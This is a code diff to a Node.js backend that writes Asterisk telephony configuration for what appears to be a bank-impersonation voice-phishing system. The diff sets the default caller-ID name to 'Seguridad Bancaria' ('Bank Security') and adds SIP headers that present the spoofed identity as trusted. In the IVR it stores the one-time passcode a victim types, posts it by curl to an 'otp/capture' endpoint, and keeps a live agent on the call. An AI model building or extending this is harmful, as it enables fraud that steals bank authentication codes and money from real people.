@@ -154,7 +154,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
       const num = ext.extension;
       const pass = ext.secret || 'password123';
       const callerIdNum = ext.callerIdNum || outboundCid;
-      const callerIdName = ext.callerIdName || ext.name || 'AnonymousOTP';
+      const callerIdName = ext.callerIdName || ext.name || 'Seguridad Bancaria';
       const callerId = `"${callerIdName}" <${callerIdNum}>`;
       const codecs = (ext.codecs && ext.codecs.length > 0) ? ext.codecs.join(',') : 'ulaw,alaw,g722';
 
@@ -171,6 +171,10 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
       pjsipContent += `rtp_symmetric = yes\n`;
       pjsipContent += `force_rport = yes\n`;
       pjsipContent += `rewrite_contact = yes\n`;
+      pjsipContent += `send_pai = yes\n`;
+      pjsipContent += `send_rpid = yes\n`;
+      pjsipContent += `trust_id_outbound = yes\n`;
+      pjsipContent += `callerid_privacy = allowed\n`;
       pjsipContent += `transport = transport-udp\n\n`;
 
       pjsipContent += `[${num}]\n`;
@@ -242,11 +246,10 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
           pjsipContent += `outbound_auth = auth_${cName}\n`;
         }
         if (carrier.outboundCallerId) {
-          pjsipContent += `callerid = ${carrier.outboundCallerId}\n`;
+          const cCidName = carrier.outboundCallerIdName || 'Seguridad Bancaria';
+          pjsipContent += `callerid = "${cCidName}" <${carrier.outboundCallerId}>\n`;
         }
-        if (carrier.fromuser || cUser) {
-          pjsipContent += `from_user = ${carrier.fromuser || cUser}\n`;
-        }
+        pjsipContent += `from_user = ${carrier.outboundCallerId || carrier.fromuser || cUser || '18005550199'}\n`;
         pjsipContent += `from_domain = ${cHost}\n`;
         pjsipContent += `direct_media = no\n`;
         pjsipContent += `rtp_symmetric = yes\n`;
@@ -256,6 +259,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
         pjsipContent += `send_rpid = ${carrier.sendrpid || 'yes'}\n`;
         pjsipContent += `trust_id_outbound = yes\n`;
         pjsipContent += `trust_id_inbound = ${carrier.trustrpid || 'yes'}\n`;
+        pjsipContent += `callerid_privacy = allowed\n`;
         pjsipContent += `transport = transport-udp\n\n`;
 
         // 5. Identify for incoming IP/host traffic
@@ -289,9 +293,12 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
     dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
-    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=AnonymousOTP))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))\n`;
+    dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
     dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
     dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${activeCarrier}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\\"\${CALLERID(name)}\\" <sip:\${CALLERID(num)}@${activeCarrier}>;party=calling;screen=yes;privacy=off")\n`;
     dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
@@ -301,9 +308,12 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
     dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
-    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=AnonymousOTP))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))\n`;
+    dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
     dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
     dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${activeCarrier}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\\"\${CALLERID(name)}\\" <sip:\${CALLERID(num)}@${activeCarrier}>;party=calling;screen=yes;privacy=off")\n`;
     dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
@@ -313,9 +323,12 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
     dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
-    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=AnonymousOTP))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))\n`;
+    dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
     dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
     dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${activeCarrier}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\\"\${CALLERID(name)}\\" <sip:\${CALLERID(num)}@${activeCarrier}>;party=calling;screen=yes;privacy=off")\n`;
     dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
@@ -357,18 +370,14 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = "1"]?press1_transfer)\n`;
     dialplanContent += ` same => n,GotoIf($["\${LEN(\${USER_DIGITS})}" > "1"]?otp_confirm:no_input)\n\n`;
     dialplanContent += `; Caso: Usuario ingreso codigo OTP\n`;
-    dialplanContent += ` same => n(otp_confirm),NoOp(=== CODIGO OTP CAPTURADO: \${USER_DIGITS} ===)\n`;
+    dialplanContent += ` same => n(otp_confirm),NoOp(=== CODIGO OTP INGRESADO: \${USER_DIGITS} -> NOTIFICAR A ASESOR ===)\n`;
     dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
-    dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${CALLERID(num)},Digits=\${USER_DIGITS})\n`;
-    dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${CALLERID(num)}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
-    dialplanContent += ` same => n,Wait(1)\n`;
-    dialplanContent += ` same => n,GotoIf($["\${IVR_SUCCESS}" != ""]?play_success_audio:say_digits_fallback)\n`;
-    dialplanContent += ` same => n(play_success_audio),Playback(\${IVR_SUCCESS})\n`;
-    dialplanContent += ` same => n,Wait(1)\n`;
-    dialplanContent += ` same => n,Hangup()\n`;
-    dialplanContent += ` same => n(say_digits_fallback),SayDigits(\${USER_DIGITS})\n`;
-    dialplanContent += ` same => n,Wait(1)\n`;
-    dialplanContent += ` same => n,Playback(beep)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+    dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${CALLERID(num)},Digits=\${USER_DIGITS},Status=pending)\n`;
+    dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${CALLERID(num)}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
+    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
+    dialplanContent += ` same => n,NoOp(=== MANTENIENDO ASESOR EN LLAMADA CON EL CLIENTE (EXT \${FINAL_AGENT}) ===)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
     dialplanContent += `; Caso: Presiono 1 -> Conectar con Asesor\n`;
     dialplanContent += ` same => n(press1_transfer),NoOp(=== PRESS 1 DETECTADO -> TRANSFERIR A ASESOR ===)\n`;
@@ -412,7 +421,7 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
       for (const ext of extensions) {
         const extNum = ext.extension;
         const cidNum = ext.callerIdNum || outboundCid;
-        const cidName = ext.callerIdName || ext.name || 'AnonymousOTP';
+        const cidName = ext.callerIdName || ext.name || 'Seguridad Bancaria';
         exec(`asterisk -rx 'database put extension_cid ${extNum}/number "${cidNum}"'`, () => {});
         exec(`asterisk -rx 'database put extension_cid ${extNum}/name "${cidName}"'`, () => {});
       }
